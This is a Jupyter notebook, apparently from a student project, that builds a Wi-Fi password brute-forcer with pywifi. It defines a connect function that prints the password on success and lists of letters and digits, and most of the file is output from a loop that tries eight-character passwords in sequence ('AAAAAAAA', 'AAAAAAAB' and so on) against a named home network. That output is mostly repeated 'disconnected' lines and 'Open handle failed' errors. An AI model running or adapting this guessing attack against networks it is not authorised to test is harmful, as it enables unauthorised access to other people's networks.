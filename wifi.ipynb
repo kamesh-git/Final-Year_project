{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "ename": "ModuleNotFoundError",
     "evalue": "No module named 'network'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
      "Input \u001b[1;32mIn [1]\u001b[0m, in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[1;32m----> 1\u001b[0m \u001b[38;5;28;01mimport\u001b[39;00m \u001b[38;5;21;01mnetwork\u001b[39;00m\n\u001b[0;32m      3\u001b[0m \u001b[38;5;28;01mdef\u001b[39;00m \u001b[38;5;21mconnect_to_wifi\u001b[39m(ssid, password):\n\u001b[0;32m      4\u001b[0m     wlan \u001b[38;5;241m=\u001b[39m network\u001b[38;5;241m.\u001b[39mWLAN(network\u001b[38;5;241m.\u001b[39mSTA_IF)\n",
      "\u001b[1;31mModuleNotFoundError\u001b[0m: No module named 'network'"
     ]
    }
   ],
   "source": [
    "import network\n",
    "\n",
    "def connect_to_wifi(ssid, password):\n",
    "    wlan = network.WLAN(network.STA_IF)\n",
    "    if not wlan.isconnected():\n",
    "        print('Connecting to network...')\n",
    "        wlan.active(True)\n",
    "        wlan.connect(ssid, password)\n",
    "        while not wlan.isconnected():\n",
    "            pass\n",
    "    print('Network configuration:', wlan.ifconfig())\n",
    "\n",
    "# Replace 'YOUR_SSID' and 'YOUR_PASSWORD' with your actual SSID and password\n",
    "connect_to_wifi('Galaxy M11', '12345678')\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: 12345678\n"
     ]
    }
   ],
   "source": [
    "import pywifi\n",
    "from pywifi import const\n",
    "\n",
    "def connect_to_wifi(ssid, password):\n",
    "    wifi = pywifi.PyWiFi()\n",
    "    iface = wifi.interfaces()[0]\n",
    "    \n",
    "    profile = pywifi.Profile()\n",
    "    profile.ssid = ssid\n",
    "    profile.auth = const.AUTH_ALG_OPEN\n",
    "    profile.akm.append(const.AKM_TYPE_WPA2PSK)\n",
    "    profile.cipher = const.CIPHER_TYPE_CCMP\n",
    "    profile.key = password\n",
    "    \n",
    "    iface.remove_all_network_profiles()\n",
    "    tmp_profile = iface.add_network_profile(profile)\n",
    "    iface.connect(tmp_profile)\n",
    "    \n",
    "    for i in range(3000): \n",
    "        if iface.status() == const.IFACE_CONNECTED:\n",
    "            print(f\"{i} Connected\")\n",
    "            print(password)\n",
    "            print(1/0)\n",
    "            \n",
    "    print('disconnected: '+password)\n",
    "    \n",
    "\n",
    "# Replace 'YOUR_SSID' and 'YOUR_PASSWORD' with your actual SSID and password\n",
    "connect_to_wifi('JioFiber-Ec5gb', '12345678')\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "uppercase = [\"A\",\"B\",\"C\",\"D\",\"E\",\"F\",\"G\",\"H\",\"I\",\"J\",\"K\",\"L\",\"M\",\"N\",\"O\",\"P\",\"Q\",\"R\",\"S\",\"T\",\"U\",\"V\",\"W\",\"X\",\"Y\",\"Z\"]\n",
    "lowercase = [\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",\"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\"r\",\"s\",\"t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\"]\n",
    "numbers = [\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAA\n",
      "disconnected: AAAAAAAB\n",
      "disconnected: AAAAAAAC\n",
      "disconnected: AAAAAAAD\n",
      "disconnected: AAAAAAAE\n",
      "disconnected: AAAAAAAF\n",
      "disconnected: AAAAAAAG\n",
      "disconnected: AAAAAAAH\n",
      "disconnected: AAAAAAAI\n",
      "disconnected: AAAAAAAJ\n",
      "disconnected: AAAAAAAK\n",
      "disconnected: AAAAAAAL\n",
      "disconnected: AAAAAAAM\n",
      "disconnected: AAAAAAAN\n",
      "disconnected: AAAAAAAO\n",
      "disconnected: AAAAAAAP\n",
      "disconnected: AAAAAAAQ\n",
      "disconnected: AAAAAAAR\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:25:49,261 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:25:50,441 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAT\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:25:51,693 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAU\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:25:52,898 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAV\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:25:54,377 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAW\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:25:55,907 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAX\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:25:57,206 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAY\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:02,498 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAZ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:07,106 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAa\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:08,527 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAb\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:09,959 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAc\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:11,306 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAd\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:12,789 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAe\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:14,769 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAf\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:16,284 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAg\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:17,895 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAh\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:19,074 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAi\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:20,264 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAj\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:22,007 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAk\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:24,523 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAl\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:25,672 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAm\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:26,835 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAn\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:28,614 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAo\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:29,785 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAp\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:30,933 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAq\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:32,113 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAr\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:33,263 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAs\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:34,496 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAt\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:35,668 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAu\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:36,826 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAv\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:37,991 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:39,179 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAx\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:40,362 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAy\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:41,523 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAAz\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:42,673 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAA0\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:43,836 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAA1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:44,986 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAA2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:46,136 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAA3\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:47,282 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAA4\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:49,134 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAA5\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:50,281 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAA6\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:52,981 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAA7\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:54,158 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAA8\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:55,341 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAA9\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:56,494 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABA\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:57,668 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABB\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:58,806 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABC\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:26:59,970 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABD\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:01,227 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABE\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:02,454 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABF\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:04,038 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABG\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:05,185 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABH\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:06,534 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABI\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:07,698 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABJ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:09,466 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABK\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:10,778 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABL\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:12,430 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABM\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:13,610 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABN\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:15,291 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABO\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:16,541 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABP\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:17,744 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABQ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:19,461 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABR\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:21,604 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:23,005 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABT\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:25,699 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABU\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:27,795 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABV\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:28,993 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABW\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:30,329 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABX\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:31,523 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABY\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:32,690 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABZ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:35,427 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABa\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:36,623 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABb\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:39,134 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABc\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:40,450 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABd\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:41,649 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABe\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:42,931 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABf\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:44,113 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABg\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:45,296 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABh\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:46,527 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABi\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:47,692 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABj\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:49,541 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABk\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:50,706 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABl\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:53,687 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABm\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:54,863 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABn\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:57,883 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABo\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:27:59,081 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABp\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:00,364 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABq\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:03,744 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABr\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:04,926 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABs\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:07,457 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABt\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:09,488 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABu\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:10,687 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABv\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:11,886 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:13,102 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABx\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:14,284 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABy\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:16,032 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAABz\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:17,270 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAB0\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-05-13 18:28:18,463 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "disconnected: AAAAAAB1\n"
     ]
